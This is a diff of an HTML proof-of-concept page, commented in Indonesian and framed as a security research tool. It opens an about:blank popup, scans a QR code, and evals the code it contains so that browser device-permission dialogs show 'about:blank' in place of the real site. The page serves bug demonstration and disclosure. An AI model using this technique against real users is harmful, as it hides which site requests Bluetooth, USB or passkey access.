@@ -3,18 +3,25 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>QR Scanner in about:blank — PoC</title>
+<title>QR Scanner in about:blank — PoC (final)</title>
 <style>
-  body { font-family: system-ui, -apple-system, sans-serif; max-width: 760px; margin: 0 auto; padding: 24px; line-height: 1.55; background: #f7f7f7; }
+  body { font-family: system-ui, -apple-system, sans-serif; max-width: 820px; margin: 0 auto; padding: 24px; line-height: 1.55; background: #f7f7f7; }
   h1 { font-size: 1.3em; margin-top: 0; }
-  .warn { background: #fff3cd; border-left: 4px solid #ffc107; padding: 12px 14px; border-radius: 4px; margin: 16px 0; font-size: 14px; }
-  .danger { background: #f8d7da; border-left: 4px solid #dc3545; padding: 12px 14px; border-radius: 4px; margin: 16px 0; font-size: 14px; }
+  h2 { font-size: 1.05em; margin-top: 0; }
+  .warn { background: #fff3cd; border-left: 4px solid #ffc107; padding: 12px 14px; border-radius: 4px; margin: 12px 0; font-size: 14px; }
+  .danger { background: #f8d7da; border-left: 4px solid #dc3545; padding: 12px 14px; border-radius: 4px; margin: 12px 0; font-size: 14px; }
   .card { background: #fff; border-radius: 8px; padding: 20px; box-shadow: 0 1px 3px rgba(0,0,0,0.08); margin: 16px 0; }
-  button { padding: 12px 22px; font-size: 15px; border-radius: 6px; border: 0; cursor: pointer; background: #007bff; color: #fff; }
+  button { padding: 12px 22px; font-size: 15px; border-radius: 6px; border: 0; cursor: pointer; background: #007bff; color: #fff; font-weight: 500; }
   button:hover { background: #0056b3; }
+  button.gray { background: #6c757d; }
+  button.gray:hover { background: #495057; }
   code { background: #eee; padding: 2px 6px; border-radius: 3px; font-family: monospace; font-size: 13px; }
-  ol { padding-left: 20px; }
+  ol { padding-left: 20px; margin: 8px 0; }
   li { margin: 6px 0; }
+  #diag { font-family: monospace; font-size: 12px; background: #fff; border: 1px solid #ddd; border-radius: 6px; padding: 10px; margin: 12px 0; }
+  #diag div { margin: 3px 0; }
+  #diag .label { color: #666; display: inline-block; width: 180px; }
+  #status { margin-top: 12px; display: none; }
 </style>
 </head>
 <body>
@@ -22,43 +29,138 @@
 <h1>📷 QR → <code>about:blank</code> → Eksekusi</h1>
 
 <div class="danger">
-  <strong>⚠️ SECURITY RESEARCH TOOL</strong> — Jalankan hanya di localhost / domain Anda sendiri. Popup yang dieksekusi memiliki akses ke <code>window.opener</code>.
+  <strong>⚠️ SECURITY RESEARCH TOOL</strong> — jalankan hanya di <code>localhost</code> / domain Anda sendiri.
 </div>
 
-<div class="warn">
-  <strong>Butuh:</strong> HTTPS atau <code>localhost</code> (secure context) &middot; Chromium desktop &middot; kamera &middot; izin popup.
+<div id="diag">
+  <div><span class="label">isSecureContext:</span><strong id="d-sec">?</strong></div>
+  <div><span class="label">window.open:</span><strong id="d-open">?</strong></div>
+  <div><span class="label">BarcodeDetector:</span><strong id="d-bd">?</strong></div>
+  <div><span class="label">protocol:</span><strong id="d-proto">?</strong></div>
+  <div><span class="label">referrer:</span><strong id="d-ref">?</strong></div>
 </div>
 
 <div class="card">
-  <h2 style="margin-top:0;font-size:1.05em;">Cara kerja</h2>
+  <h2>Cara kerja</h2>
   <ol>
-    <li>Klik tombol di bawah → popup <code>about:blank</code> terbuka.</li>
-    <li>Di dalam popup: klik <strong>Start Camera</strong> → arahkan ke QR code.</li>
+    <li>Klik <strong>Buka QR Scanner</strong> → popup <code>about:blank</code> terbuka.</li>
+    <li>Di dalam popup: klik <strong>Start Camera</strong>, arahkan ke QR code.</li>
     <li>QR terdeteksi → klik <strong>Execute</strong>.</li>
-    <li>Kode berjalan di dalam popup <code>about:blank</code>.</li>
-    <li>Permission dialog (Bluetooth/USB/Serial/Passkey/dll.) yang muncul menampilkan <strong><code>about:blank</code></strong>, bukan domain Anda → bug terbukti.</li>
+    <li>Permission dialog (Bluetooth/USB/Serial/Passkey/dll.) menampilkan <code>about:blank</code>, bukan domain Anda → bug terbukti.</li>
   </ol>
-  <button id="openBtn">▶ Buka QR Scanner di about:blank</button>
+  <button id="openBtn">▶ Buka QR Scanner (about:blank)</button>
+  <button id="testBtn" class="gray">🧪 Test Popup Sederhana</button>
+  <div id="status"></div>
 </div>
 
 <script>
-document.getElementById('openBtn').addEventListener('click', function () {
-  const w = window.open('about:blank', '_blank', 'width=920,height=900');
-  if (!w) { alert('Popup diblokir. Izinkan popup lalu coba lagi.'); return; }
+(function () {
+  'use strict';
 
-  w.document.open();
-  w.document.write(popupHTML());
-  w.document.close();
-  w.focus();
-});
+  var $ = function (id) { return document.getElementById(id); };
+  var statusEl = $('status');
 
-/* ============ HTML yang di-inject ke about:blank ============ */
-function popupHTML() {
-  return `<!DOCTYPE html>
+  function setStatus(html, type) {
+    var colors = { ok: '#28a745', err: '#dc3545', warn: '#856404', info: '#0c5460' };
+    statusEl.style.display = 'block';
+    statusEl.innerHTML = '<div style="padding:10px 12px;border-radius:6px;border-left:4px solid ' +
+      (colors[type] || '#666') + ';background:#fff;font-size:13px;">' + html + '</div>';
+  }
+
+  /* ---------- Diagnostik ---------- */
+  $('d-sec').textContent   = window.isSecureContext;
+  $('d-open').textContent  = typeof window.open;
+  $('d-bd').textContent    = ('BarcodeDetector' in window);
+  $('d-proto').textContent = location.protocol;
+  $('d-ref').textContent   = document.referrer || '(none)';
+  if (!window.isSecureContext) $('d-sec').innerHTML = '<span style="color:#dc3545">false ⚠️</span>';
+
+  /* ---------- Inject HTML ke popup via DOM ---------- */
+  function injectPopup(w) {
+    var doc = w.document;
+    var parser = new DOMParser();
+    var parsed = parser.parseFromString(popupHTML(), 'text/html');
+
+    // Copy <style> ke <head>
+    var styles = parsed.querySelectorAll('style');
+    for (var i = 0; i < styles.length; i++) {
+      var ns = doc.createElement('style');
+      ns.textContent = styles[i].textContent;
+      doc.head.appendChild(ns);
+    }
+
+    // Body tanpa <script> (innerHTML tidak eksekusi script)
+    var bodyHTML = parsed.body.innerHTML.replace(/<script[\s\S]*?<\/script>/gi, '');
+    doc.body.innerHTML = bodyHTML;
+
+    // Inject & jalankan <script> manual
+    var scripts = parsed.querySelectorAll('script');
+    for (var j = 0; j < scripts.length; j++) {
+      var sc = doc.createElement('script');
+      if (scripts[j].src) sc.src = scripts[j].src;
+      else sc.textContent = scripts[j].textContent;
+      doc.body.appendChild(sc);
+    }
+
+    return !!doc.getElementById('startBtn');
+  }
+
+  /* ---------- Handler utama ---------- */
+  $('openBtn').addEventListener('click', function () {
+    statusEl.style.display = 'none';
+    setStatus('Membuka popup…', 'info');
+
+    var w = window.open('about:blank', '_blank', 'width=920,height=900,resizable=yes');
+    if (!w) {
+      setStatus(
+        '<strong>❌ Popup diblokir.</strong><br>' +
+        'Klik ikon 🚫 di address bar → <em>Always allow popups</em> → coba lagi.<br>' +
+        'Atau host via <code>http://localhost:8000/</code> (bukan <code>file://</code>).',
+        'err');
+      return;
+    }
+
+    try {
+      var ok = injectPopup(w);
+      if (ok) {
+        setStatus('✅ Popup <code>about:blank</code> berisi scanner. Lanjut di jendela popup.', 'ok');
+      } else {
+        setStatus('⚠️ Konten terinject tapi tombol scanner tidak ditemukan. Cek Console (F12).', 'warn');
+      }
+    } catch (e) {
+      setStatus('❌ Gagal inject: <code>' + e.message + '</code>', 'err');
+      console.error('[PoC] inject failed:', e);
+    }
+
+    w.focus();
+  });
+
+  /* ---------- Test popup ---------- */
+  $('testBtn').addEventListener('click', function () {
+    statusEl.style.display = 'none';
+    var w = window.open('about:blank', '_blank', 'width=400,height=300');
+    if (!w) { setStatus('❌ Test popup juga diblokir — masalah di popup blocker browser.', 'err'); return; }
+    try {
+      var doc = w.document;
+      var style = doc.createElement('style');
+      style.textContent = 'body{font-family:system-ui;padding:20px}code{background:#eee;padding:2px 5px}';
+      doc.head.appendChild(style);
+      doc.body.innerHTML = '<h2>✅ Test OK</h2>' +
+        '<p>href: <code>about:blank</code></p>' +
+        '<p>origin: <code>' + (doc.location ? doc.location.origin : '?') + '</code></p>' +
+        '<p>Popup bekerja normal (DOM injection).</p>';
+      setStatus('✅ Test popup berhasil. Mekanisme popup OK.', 'ok');
+    } catch (e) {
+      setStatus('⚠️ Popup terbuka tapi DOM inject gagal: <code>' + e.message + '</code>', 'err');
+    }
+  });
+
+  /* ---------- Popup HTML ---------- */
+  function popupHTML() {
+    return `<!DOCTYPE html>
 <html lang="id">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>about:blank — QR Scanner</title>
 <style>
   body { font-family: system-ui, -apple-system, sans-serif; max-width: 760px; margin: 0 auto; padding: 18px; background: #fafafa; line-height: 1.5; }
@@ -66,7 +168,7 @@ function popupHTML() {
   h3 { font-size: 1em; margin: 16px 0 6px; }
   .meta { background: #fff; border: 1px solid #ddd; border-radius: 6px; padding: 10px 12px; font-size: 13px; font-family: monospace; }
   .meta div { margin: 2px 0; }
-  .meta .label { color: #666; display: inline-block; width: 110px; }
+  .meta .label { color: #666; display: inline-block; width: 120px; }
   video { width: 100%; max-width: 480px; border-radius: 8px; background: #000; display: block; margin: 12px auto; }
   button { padding: 9px 16px; font-size: 14px; border-radius: 5px; border: 0; cursor: pointer; background: #007bff; color: #fff; margin: 4px 4px 4px 0; }
   button:hover { background: #0056b3; }
@@ -76,22 +178,20 @@ function popupHTML() {
   button.danger { background: #dc3545; }
   button.danger:hover { background: #a71d2a; }
   pre { background: #f4f4f4; border: 1px solid #e0e0e0; border-radius: 6px; padding: 10px; overflow-x: auto; white-space: pre-wrap; word-break: break-all; font-size: 12px; font-family: monospace; min-height: 40px; }
+  textarea { width: 100%; min-height: 70px; font-family: monospace; font-size: 12px; padding: 8px; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; }
   .status { font-size: 13px; color: #555; margin-top: 6px; }
   .ok { color: #28a745; }
   .err { color: #dc3545; }
 </style>
 </head>
 <body>
-
 <h2>about:blank — QR Scanner &amp; Executor</h2>
-
 <div class="meta">
   <div><span class="label">location.href:</span><strong id="mHref">?</strong></div>
   <div><span class="label">location.origin:</span><strong id="mOrigin">?</strong></div>
   <div><span class="label">window.origin:</span><strong id="mWinOrigin">?</strong></div>
   <div><span class="label">isSecureContext:</span><strong id="mSec">?</strong></div>
 </div>
-
 <h3>1. Scan QR</h3>
 <video id="video" autoplay playsinline muted></video>
 <div>
@@ -99,35 +199,28 @@ function popupHTML() {
   <button id="stopBtn" class="gray" disabled>⏹ Stop</button>
 </div>
 <div class="status" id="scanStatus">Kamera idle.</div>
-
 <h3>2. Hasil &amp; Eksekusi</h3>
 <pre id="result">(belum ada QR terdeteksi)</pre>
 <button id="execBtn" class="danger" disabled>🚀 Execute di about:blank ini</button>
 <div class="status" id="execStatus"></div>
 <pre id="log" style="display:none"></pre>
-
 <h3>3. Manual (fallback)</h3>
-<textarea id="manual" style="width:100%;min-height:70px;font-family:monospace;font-size:12px;padding:8px;border:1px solid #ccc;border-radius:6px;box-sizing:border-box;" placeholder="navigator.bluetooth.requestDevice({acceptAllDevices:true})"></textarea>
+<textarea id="manual" placeholder="navigator.bluetooth.requestDevice({acceptAllDevices:true})"></textarea>
 <div><button id="manualBtn" class="danger" style="margin-top:6px;">🚀 Execute manual</button></div>
-
 <script>
 (function(){
   'use strict';
   var $ = function(id){ return document.getElementById(id); };
-
-  /* ---- Metadata ---- */
   $('mHref').textContent      = location.href;
   $('mOrigin').textContent    = location.origin;
   $('mWinOrigin').textContent = window.origin || '(undefined)';
   $('mSec').textContent       = window.isSecureContext;
 
-  /* ---- State ---- */
   var stream = null, rafId = null, detector = null, jsQRReady = false;
   var scanActive = false, scannedCode = '';
   var canvas = document.createElement('canvas');
   var ctx = canvas.getContext('2d', { willReadFrequently: true });
 
-  /* ---- Detector setup ---- */
   async function ensureDetector() {
     if ('BarcodeDetector' in window) {
       try { return new BarcodeDetector({ formats: ['qr_code'] }); } catch (e) {}
@@ -144,7 +237,6 @@ function popupHTML() {
     return null;
   }
 
-  /* ---- Scan ---- */
   async function startScan() {
     try {
       $('scanStatus').textContent = 'Menyiapkan kamera…';
@@ -154,12 +246,8 @@ function popupHTML() {
       });
       $('video').srcObject = stream;
       await $('video').play();
-
       detector = await ensureDetector();
-      $('scanStatus').textContent = detector
-        ? '📷 Scanning (BarcodeDetector)…'
-        : '📷 Scanning (jsQR)…';
-
+      $('scanStatus').textContent = detector ? '📷 Scanning (BarcodeDetector)…' : '📷 Scanning (jsQR)…';
       scanActive = true;
       $('startBtn').disabled = true;
       $('stopBtn').disabled = false;
@@ -178,7 +266,6 @@ function popupHTML() {
         canvas.width = w; canvas.height = h;
         ctx.drawImage(v, 0, 0, w, h);
         var found = null;
-
         if (detector) {
           try {
             var codes = await detector.detect(canvas);
@@ -191,7 +278,6 @@ function popupHTML() {
             if (qr && qr.data) found = qr.data;
           } catch (e) {}
         }
-
         if (found) { onDetected(found); return; }
       }
     }
@@ -225,7 +311,6 @@ function popupHTML() {
     } catch (e) {}
   }
 
-  /* ---- Execute in THIS about:blank window ---- */
   function normalize(raw) {
     var code = String(raw || '').trim();
     if (/^javascript:/i.test(code)) code = code.replace(/^javascript:/i, '');
@@ -235,27 +320,15 @@ function popupHTML() {
 
   function execute(raw) {
     var code = normalize(raw);
-    if (!code) {
-      $('execStatus').textContent = '⚠️ Tidak ada kode.';
-      return;
-    }
-
+    if (!code) { $('execStatus').textContent = '⚠️ Tidak ada kode.'; return; }
     $('log').style.display = 'block';
     $('log').textContent = '► Executing in about:blank…';
-    $('execStatus').textContent = 'Kode dijalankan. Jika permission dialog muncul, cek apakah origin tertulis about:blank.';
-
-    // (0, eval) = indirect eval → global scope of THIS about:blank window.
-    // Dipanggil sinkron dalam click handler → transient user activation
-    // masih valid saat requestDevice() dipanggil → chooser muncul.
-    // Async IIFE memungkinkan `await` + catch error.
+    $('execStatus').textContent = 'Kode dijalankan. Cek apakah permission dialog menampilkan about:blank.';
     var wrapped =
-      '(async () => {\n' +
-      code + '\n' +
-      '})().catch(e => {' +
+      '(async () => {\n' + code + '\n})().catch(e => {' +
       '  var l = document.getElementById("log");' +
       '  if (l) l.textContent += "\\n✗ " + e.name + ": " + e.message;' +
       '});';
-
     try {
       (0, eval)(wrapped);
     } catch (e) {
@@ -263,7 +336,6 @@ function popupHTML() {
     }
   }
 
-  /* ---- Wiring ---- */
   $('startBtn').onclick  = startScan;
   $('stopBtn').onclick   = stopScan;
   $('execBtn').onclick   = function(){ execute(scannedCode); };
@@ -272,7 +344,8 @@ function popupHTML() {
 <\/script>
 </body>
 </html>`;
-}
+  }
+})();
 </script>
 </body>
 </html>
